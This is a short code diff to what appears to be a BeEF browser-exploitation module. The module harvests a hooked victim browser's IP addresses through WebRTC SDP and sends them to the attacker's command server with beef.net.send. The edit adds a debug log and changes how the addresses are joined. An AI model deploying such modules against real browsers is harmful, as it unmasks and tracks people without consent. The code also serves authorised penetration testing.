@@ -35,7 +35,8 @@ beef.execute(function() {
 	        if (newAddr in addrs) return;
 	        else addrs[newAddr] = true;
 	        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
-	        beef.net.send('<%= @command_url %>', <%= @command_id %>, "IP is " + displayAddrs.join(" or perhaps "));
+		beef.debug("Found IPs: "+ displayAddrs.join(","))
+	        beef.net.send('<%= @command_url %>', <%= @command_id %>, "IP is " + displayAddrs.join(","));
 	    }
 	    
 	    function grepSDP(sdp) {
